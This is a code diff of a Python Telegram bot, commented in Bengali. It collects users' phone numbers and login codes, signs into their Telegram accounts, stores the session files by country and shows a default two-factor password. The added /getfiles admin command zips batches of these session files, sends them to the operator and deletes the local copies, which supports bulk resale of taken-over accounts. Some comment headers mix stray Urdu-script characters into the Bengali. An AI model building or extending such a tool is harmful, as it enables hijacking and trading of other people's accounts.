@@ -1,6 +1,8 @@
 import os
 import asyncio
 import json
+import shutil
+import zipfile
 from datetime import datetime
 from threading import Thread
 from flask import Flask, render_template_string
@@ -30,6 +32,7 @@ if not os.path.exists(BASE_STORAGE_DIR):
 user_data = {}
 admin_state = {}
 
+# শুরুতে ব্ল্যাঙ্ক বা ডিফল্ট কিছু কান্ট্রি (এডমিন প্যানেল থেকে আপনি যেকোনো সময় পরিবর্তন/যোগ করতে পারবেন)
 DEFAULT_SETTINGS = {
     "security_password": "MySecureBotPassword123",
     "country_prices": {"52": 0.51, "60": 0.47, "49": 0.90, "54": 0.50, "880": 0.15},
@@ -115,11 +118,15 @@ Thread(target=run_web, daemon=True).start()
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
-def get_country_code(phone_number):
+def check_valid_country_and_get_code(phone_number):
     clean = phone_number.replace("+", "").replace(" ", "")
-    for code in sorted(load_settings()["country_prices"].keys(), key=len, reverse=True):
-        if clean.startswith(code): return code
-    return clean[:3]
+    settings = load_settings()
+    # সবচেয়ে বড় কোড ম্যাচিং আগে করার জন্য সাজানো (যেমন: ৮৮০ আগে চেক হবে ৮ এর আগে)
+    sorted_codes = sorted(settings["country_prices"].keys(), key=len, reverse=True)
+    for code in sorted_codes:
+        if clean.startswith(code):
+            return code
+    return None
 
 # ==================== ফ্রন্টএন্ড ইউজার হ্যান্ডলার্স ====================
 def process_start(message):
@@ -194,7 +201,7 @@ def cmd_withdraw(message): process_withdraw(message)
 @bot.message_handler(commands=['withdrawhistory'])
 def cmd_history(message): bot.send_message(message.chat.id, "📜 Your withdrawal history is empty.")
 
-# ==================== এডমিন কন্ট্রোল প্যানেল UI ====================
+# ==================== ایڈمین কন্ট্রোল پ্যানেল UI ====================
 @bot.message_handler(commands=['panel'])
 def admin_panel_command(message):
     if message.from_user.id != ADMIN_ID: return
@@ -213,7 +220,7 @@ def admin_panel_command(message):
     panel_msg = (
         "🛠 *Master Admin Control Panel*\n\n"
         f"🔐 *Default 2FA Password:* `{settings['security_password']}`\n\n"
-        "📈 *Current Active Countries & Settings:*\n"
+        "📈 *Currently Allowed/Opened Countries:*\n"
     )
     for code in settings["country_prices"]:
         prc = settings["country_prices"][code]
@@ -223,7 +230,21 @@ def admin_panel_command(message):
         
     bot.send_message(message.chat.id, panel_msg, reply_markup=markup)
 
-# ==================== এডমিন বাটন অ্যাকশন হ্যান্ডলিং ====================
+# ==================== ایڈمین ফাইল এক্সট্রাকশন কম্যান্ড (/getfiles) ====================
+@bot.message_handler(commands=['getfiles'])
+def cmd_get_files(message):
+    if message.from_user.id != ADMIN_ID: return
+    guide = (
+        "📥 *Download Session Files*\n\n"
+        "Please send the query in the exact format below:\n"
+        "`CountryCode=HowManyPieces`\n\n"
+        "Example to get 10 pieces of Bangladesh files:\n"
+        "`880=10`"
+    )
+    bot.send_message(message.chat.id, guide)
+    admin_state[message.from_user.id] = "wait_extract_files"
+
+# ==================== ایڈمین বাটন অ্যাকশন হ্যান্ডলিং ====================
 @bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_"))
 def handle_admin_callbacks(call):
     if call.from_user.id != ADMIN_ID: return
@@ -242,7 +263,6 @@ def handle_admin_callbacks(call):
             file_msg += f"🌍 Country `+{code}`: **{count} Pcs**\n"
         file_msg += f"\n📊 *Total Combined Backup Files:* `{total_files} Pcs`"
         
-        # ব্যাক প্যানেল বাটন সহ মেসেজ পাঠানো
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("⬅️ Back to Panel", callback_data="pnl_back"))
         bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=file_msg, reply_markup=markup, parse_mode="Markdown")
@@ -269,18 +289,18 @@ def handle_admin_callbacks(call):
         bot.send_message(call.message.chat.id, guide_msg)
         admin_state[call.from_user.id] = "wait_country_all"
 
-# ==================== গ্লোবাল মেসেজ ফিল্টারিং ও স্টেট প্রসেসিং ====================
+# ==================== গ্লোবাল মেসেজ ফিল্টারিং ও কান্ট্রি ভ্যালিডেশন ====================
 @bot.message_handler(func=lambda message: True)
 def handle_text(message):
     user_id = message.from_user.id
     text = message.text.strip()
     low_text = text.lower()
 
-    # ১. এডমিন স্টেট হ্যান্ডলিং (ফিক্সড ও ১০০% ওয়ার্কিং মেকানিজম)
+    # ১. এডمین سٹیٹ ہینڈلنگ
     if user_id == ADMIN_ID and user_id in admin_state:
         state = admin_state[user_id]
         settings = load_settings()
-        del admin_state[user_id] # স্টেট সাথে সাথে রিলিজ করা হলো যাতে লুপ না হয়
+        del admin_state[user_id] 
         
         try:
             if state == "wait_pass":
@@ -309,29 +329,70 @@ def handle_text(message):
                     f"⏳ Confirmation Time: **{delay} Seconds**"
                 )
                 bot.reply_to(message, success_msg)
+
+            elif state == "wait_extract_files":
+                parts = text.split("=")
+                code = parts[0].strip().replace("+", "")
+                count_to_get = int(parts[1].strip())
+                
+                target_dir = os.path.join(BASE_STORAGE_DIR, code)
+                if not os.path.exists(target_dir):
+                    bot.reply_to(message, "❌ No files found for this country code!")
+                    return
+                
+                all_files = sorted([f for f in os.listdir(target_dir) if f.endswith(".session")])
+                if not all_files:
+                    bot.reply_to(message, "❌ No session files available in this directory!")
+                    return
+                
+                actual_count = min(count_to_get, len(all_files))
+                files_to_zip = all_files[:actual_count]
+                
+                zip_filename = f"sessions_{code}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+                
+                with zipfile.ZipFile(zip_filename, 'w') as zipf:
+                    for f in files_to_zip:
+                        f_path = os.path.join(target_dir, f)
+                        zipf.write(f_path, f)
+                        try: os.remove(f_path)
+                        except: pass
+                
+                with open(zip_filename, 'rb') as z:
+                    bot.send_document(message.chat.id, z, caption=f"📦 *Successfully Extracted:*\n🌍 Country: `+{code}`\n📊 Requested: `{count_to_get} Pcs` | Found & Sent: `{actual_count} Pcs`")
+                
+                try: os.remove(zip_filename)
+                except: pass
+
         except Exception as e:
-            bot.reply_to(message, f"❌ *Format Error!* Please try again carefully. Error: {str(e)}")
+            bot.reply_to(message, f"❌ *Format Error!* Please try again. Error: {str(e)}")
         return
 
     # ২. ইউজার মেনু বাটন হ্যান্ডলিং
-    if "start" in low_text: process_start(message); return
-    elif "cancel" in low_text: process_cancel(message); return
-    elif "capacity" in low_text: process_capacity(message); return
-    elif "account" in low_text: process_account(message); return
-    elif "withdraw" in low_text: process_withdraw(message); return
+    if "start" in low_text or "/start" in low_text: process_start(message); return
+    elif "cancel" in low_text or "/cancel" in low_text: process_cancel(message); return
+    elif "capacity" in low_text or "/capacity" in low_text: process_capacity(message); return
+    elif "account" in low_text or "/account" in low_text: process_account(message); return
+    elif "withdraw" in low_text or "/withdraw" in low_text: process_withdraw(message); return
 
-    # ৩. নম্বর ইনপুট ও ওটিপি প্রসেসিং (ব্যাকগ্রাউন্ডে সেশন অটোমেশন)
+    # ৩. নম্বর ইনপুট ও কান্ট্রি ওপেন/ক্লোজ ভ্যালিডেশন ফিল্টার
     if text.startswith("+") or text.isdigit():
         phone = text if text.startswith("+") else f"+{text}"
+        
+        # এখানে ফিল্টারিং চেক হচ্ছে (অ্যাড করা দেশগুলোর বাইরে অন্য কোনো কোড পেলে সাথে সাথে রিজেক্ট)
+        matched_country_code = check_valid_country_and_get_code(phone)
+        if not matched_country_code:
+            bot.reply_to(message, "❗you cannot at account from country.")
+            return
+            
         bot.reply_to(message, "⏳ Requesting OTP from Telegram Servers...")
-        loop.run_until_complete(send_otp_task(phone, user_id, message))
+        loop.run_until_complete(send_otp_task(phone, matched_country_code, user_id, message))
+        
     elif user_id in user_data and "phone_code_hash" in user_data[user_id]:
         loop.run_until_complete(verify_otp_task(text, user_id, message))
 
-# ==================== ওটিপি ও সেশন কোর অটোমেশন ব্যাকএন্ড ====================
-async def send_otp_task(phone_number, user_id, message):
+# ==================== ওটিپی ও সেশন কোর অটোমেশন ব্যাকএন্ড ====================
+async def send_otp_task(phone_number, country_code, user_id, message):
     settings = load_settings()
-    country_code = get_country_code(phone_number)
     max_capacity = settings["country_capacity"].get(country_code, 9999)
     if get_current_file_count(country_code) >= max_capacity:
         bot.reply_to(message, f"❌ **Capacity Over!** for code `+{country_code}`.")
